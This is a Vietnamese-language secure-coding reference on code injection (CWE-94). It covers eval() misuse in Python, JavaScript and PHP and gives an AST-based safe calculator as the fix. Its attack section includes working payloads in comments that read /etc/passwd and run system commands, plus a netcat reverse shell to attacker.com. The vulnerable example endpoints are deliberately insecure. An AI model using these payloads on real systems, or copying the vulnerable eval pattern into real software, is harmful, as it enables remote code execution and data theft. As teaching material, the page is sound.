# Code Injection

> **CWE**: CWE-94 | **Phân loại**: Injection

## Kiến thức Nền tảng

Hãy tưởng tượng bạn đang hướng dẫn cho một robot làm việc nhà. Thay vì chỉ đưa cho nó các lệnh cố định như "quét nhà", bạn lại đưa cho nó một chiếc hộp kỳ diệu có thể tự động chạy bất kỳ mệnh lệnh nào viết trên giấy. Trong thế giới lập trình, các ngôn ngữ như Python, JavaScript hay PHP cũng sở hữu những "chiếc hộp" như thế – đó là các hàm thực thi mã động (dynamic code evaluation) như `eval()` hay `exec()`. Chúng sinh ra để hệ thống trở nên linh hoạt hơn, chẳng hạn như để tự động tính toán các biểu thức phức tạp hoặc vận hành hệ thống template. Tuy nhiên, nếu bạn để người lạ tự tiện ghi chữ vào giấy rồi bỏ vào chiếc hộp đó, robot sẽ làm theo mọi yêu cầu của họ, kể cả những yêu cầu phá hoại. Hãy lưu ý rằng lỗ hổng này khác với việc chèn lệnh hệ điều hành (OS Command Injection) – ở đây, kẻ xấu đang thao túng chính "bộ não" và ngữ cảnh chạy của ngôn ngữ lập trình.

```python
# Simple calculator — legitimate use of eval (still risky)
expression = "2 + 3 * 4"
result = eval(expression)  # Returns 14
print(f"Result: {result}")
```

## Mô tả lỗ hổng

Lỗ hổng Code Injection xuất hiện khi một ứng dụng "nhẹ dạ cả tin" nhận thông tin từ người dùng rồi đưa trực tiếp vào những hàm thực thi động này mà không hề có sự kiểm soát hay chọn lọc. Hãy hình dung một chiếc máy tính trực tuyến nhận biểu thức tính toán nhưng lại trực tiếp chạy nó như một đoạn code Python thực thụ. Kẻ tấn công có thể lợi dụng sơ hở này để gửi đi những "phép tính" kỳ lạ, nhưng thực chất là lệnh để đọc trộm các file dữ liệu nhạy cảm trên máy chủ, lấy đi các chìa khóa bảo mật, hay thậm chí là chiếm quyền điều khiển máy chủ từ xa (RCE). Lỗ hổng này đặc biệt nguy hiểm bởi nó mở toang cánh cửa vào sâu bên trong ứng dụng, biến hệ thống của bạn thành công cụ đắc lực cho kẻ xấu.

## Cơ chế tấn công

**Python eval() exploitation**:

```python
# Vulnerable calculator endpoint
user_input = request.args.get('expr')
result = eval(user_input)

# Attacker input to read /etc/passwd:
# expr=__import__('os').popen('cat /etc/passwd').read()

# Attacker input to spawn reverse shell:
# expr=__import__('os').system('nc -e /bin/sh attacker.com 4444')
```

**JavaScript eval() exploitation**:

```javascript
// Vulnerable template processing
app.get('/calc', (req, res) => {
    let expr = req.query.expr;
    let result = eval(expr);  // DANGER: Direct eval of user input
    res.send(`Result: ${result}`);
});

// Attacker payload to read files:
// /calc?expr=require('child_process').execSync('cat /etc/passwd').toString()
```

**PHP eval() exploitation**:

```php
<?php
// Vulnerable dynamic code execution
$code = $_GET['code'];
eval($code);  // DANGER: Arbitrary PHP execution

// Attacker payload:
// ?code=system('whoami');
// ?code=file_get_contents('/etc/passwd');
?>
```

## Biện pháp phòng thủ

- **Tóm tắt**: Hạn chế và loại bỏ hoàn toàn việc thực thi mã động không an toàn, sử dụng phân tích cú pháp an toàn và kiểm soát môi trường thực thi.
- **Các bước chi tiết**:
  - Tuyệt đối tránh eval(): Trong 99% trường hợp, có giải pháp thay thế an toàn hơn. Dùng parser chuyên dụng cho biểu thức toán học.
  - Whitelist operations: Nếu bắt buộc xử lý biểu thức, chỉ cho phép toán tử và số, reject mọi thứ khác.
  - Sandbox execution: Nếu phải thực thi code động, sử dụng sandbox (Docker container, VM, hoặc restricted environment).
  - AST-based evaluation: Parse input thành Abstract Syntax Tree, validate từng node trước khi thực thi.
  - Content Security Policy: Trong browser, CSP `script-src` ngăn chặn inline eval.

## Code Example

```python
# === VULNERABLE CODE ===
from flask import Flask, request

app = Flask(__name__)

@app.route('/calculate')
def calculate():
    expression = request.args.get('expr', '0')
    # DANGER: eval() executes arbitrary Python code
    result = eval(expression)
    return f"Result: {result}"


# === SECURE CODE ===
import ast
import operator
from flask import Flask, request

app = Flask(__name__)

# Whitelist of safe operations
SAFE_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
}

def safe_eval(expr):
    """Evaluate arithmetic expressions using AST parsing"""
    tree = ast.parse(expr, mode='eval')

    def _eval(node):
        # Only allow numbers
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        # Only allow whitelisted binary operations
        elif isinstance(node, ast.BinOp) and type(node.op) in SAFE_OPS:
            left = _eval(node.left)
            right = _eval(node.right)
            return SAFE_OPS[type(node.op)](left, right)
        # Only allow top-level Expression wrapper
        elif isinstance(node, ast.Expression):
            return _eval(node.body)
        else:
            raise ValueError(f"Unsupported operation: {type(node).__name__}")

    return _eval(tree)

@app.route('/calculate')
def calculate():
    expression = request.args.get('expr', '0')
    try:
        # Safe AST-based evaluation — no arbitrary code execution
        result = safe_eval(expression)
        return f"Result: {result}"
    except (ValueError, SyntaxError) as e:
        return f"Invalid expression", 400
```

## Xem thêm

- [Command Execution](../command-execution/) — Thực thi lệnh trực tiếp trên hệ điều hành của máy chủ đích.
- [Insecure Deserialization](../../08-data-integrity-failures/insecure-deserialization/) — Giải tuần tự hóa không an toàn có thể dẫn đến việc khởi tạo đối tượng độc hại gây chèn mã hoặc thực thi mã từ xa.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/os-command-injection
- OWASP: https://owasp.org/www-community/attacks/Code_Injection
- CWE: https://cwe.mitre.org/data/definitions/94.html

## Giải thích thuật ngữ

- **Code Injection**: Lỗ hổng cho phép kẻ tấn công chèn và thực thi mã độc trong ngữ cảnh của ngôn ngữ lập trình.
- **Dynamic Code Evaluation**: Khả năng thực thi các chuỗi ký tự như mã nguồn tại thời điểm chạy (runtime).
- **RCE (Remote Code Execution)**: Lỗ hổng thực thi mã từ xa, cho phép kẻ tấn công chạy lệnh tùy ý trên máy chủ mục tiêu.
- **Runtime Environment**: Môi trường thực thi của ứng dụng tại thời điểm chạy.
- **AST (Abstract Syntax Tree)**: Cây cú pháp trừu tượng, cấu trúc phân tích mã nguồn thành dạng cây để kiểm tra và xử lý an toàn.
